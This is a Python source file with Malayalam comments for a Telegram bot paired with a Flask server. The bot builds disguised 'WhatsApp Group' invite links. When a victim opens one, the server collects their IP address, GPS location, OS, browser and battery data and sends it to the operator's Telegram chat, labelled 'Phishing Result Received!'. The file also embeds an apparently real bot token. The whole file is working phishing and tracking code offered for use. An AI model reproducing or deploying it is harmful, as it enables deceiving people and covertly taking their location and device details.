import os
import threading
import requests
from flask import Flask, render_template, request, jsonify
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# --- സെറ്റിംഗ്സ് ---
# GitHub-ൽ അപ്‌ലോഡ് ചെയ്യുമ്പോൾ ടോക്കൺ സുരക്ഷിതമായി വെക്കാൻ os.getenv ഉപയോഗിക്കുന്നു
TOKEN = os.getenv('BOT_TOKEN', '8619342353:AAHJRIZvlj1weBM6jkLUWAHDeo6eNoBcR18')

# Render അല്ലെങ്കിൽ മറ്റ് സർവർ നൽകുന്ന URL ഇവിടെ നൽകണം
# ഉദാഹരണത്തിന്: 'https://your-app-name.onrender.com'
BASE_URL = os.getenv('BASE_URL', 'YOUR_URL_HERE') 

app = Flask(__name__)

# --- വെബ് സെർവർ ഭാഗം (Flask) ---

@app.route('/join')
def join():
    group_name = request.args.get('group', 'WhatsApp Group')
    chat_id = request.args.get('id')
    # templates/index.html ലോഡ് ചെയ്യുന്നു
    return render_template('index.html', group_name=group_name, chat_id=chat_id)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    chat_id = data.get('chat_id')
    
    # ലഭിച്ച വിവരങ്ങൾ വൃത്തിയായി ഫോർമാറ്റ് ചെയ്യുന്നു
    report = (
        f"🎯 **Phishing Result Received!** 🎯\n\n"
        f"📱 **OS:** {data.get('platform')}\n"
        f"🔋 **Battery:** {data.get('battery')}\n"
        f"🌐 **Browser:** {data.get('browser')[:60]}...\n"
        f"📡 **IP Address:** {request.remote_addr}\n"
        f"📍 **Location:** https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
    )
    
    # ടെലിഗ്രാമിലേക്ക് റിപ്പോർട്ട് അയക്കുന്നു
    send_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(send_url, data={'chat_id': chat_id, 'text': report, 'parse_mode': 'Markdown'})
    
    return jsonify({"status": "success"})

def run_flask():
    # ക്ലൗഡ് സർവറുകൾ നൽകുന്ന പോർട്ട് ഉപയോഗിക്കുന്നു
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

# --- ടെലിഗ്രാം ബോട്ട് ഭാഗം ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋\ngroup name type cheyy"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    group_name = update.message.text
    chat_id = update.message.chat_id
    
    # സ്പെയിസ് മാറ്റാൻ URL Encoding
    safe_group_name = group_name.replace(' ', '%20')
    invite_link = f"{BASE_URL}/join?group={safe_group_name}&id={chat_id}"
    
    await update.message.reply_text(
        f"✅ ready ayi aliyaa\n\n\n\n{invite_link}"
    )

def run_bot():
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    application.run_polling()

# --- മെയിൻ റണ്ണിംഗ് ഭാഗം ---

if __name__ == '__main__':
    # സർവർ ബാക്ക്ഗ്രൗണ്ടിൽ റൺ ചെയ്യുന്നു
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    # ബോട്ട് റൺ ചെയ്യുന്നു
    print("ബോട്ട് സജ്ജമാണ്...")
    run_bot()